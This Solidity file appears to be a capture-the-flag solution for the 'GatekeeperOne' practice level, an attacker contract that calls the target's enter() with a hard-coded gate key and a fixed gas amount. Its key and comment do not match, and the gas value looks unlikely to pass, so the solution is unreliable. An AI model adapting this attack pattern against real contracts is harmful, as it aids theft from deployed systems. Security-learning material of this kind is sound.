pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract AttackerContractV2 {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function getGateKey() internal pure returns (bytes8) {
        return bytes8(uint64(0x133700002266)); // 0x13370000 + 0x00002266
    }

    function attack() external {
        GatekeeperOne(instance).enter{gas: 8191}(getGateKey());
    }
}
